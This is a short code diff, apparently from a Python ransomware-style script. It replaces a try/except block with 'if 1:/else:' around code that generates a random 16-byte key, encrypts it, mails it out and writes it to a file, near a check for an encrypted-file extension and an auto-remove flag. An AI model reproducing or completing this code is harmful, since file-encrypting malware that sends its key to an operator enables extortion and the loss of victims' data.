@@ -86,7 +86,7 @@ def crypted_file(filename):
     global FILE_EXT
     return (True if filename.endswith(FILE_EXT) else False)
 
-try:
+if 1:
         key=rand.new().read(16)
         sent_key=enc_key(key)
         if AUTORM:
@@ -94,7 +94,7 @@ try:
         mail(sent_key[0])
         with open("key", "w") as k:
                 k.write("%s"%sent_key)
-except:
+else:
         print("Key failure")
         exit(0)
 if len(key)!=16:
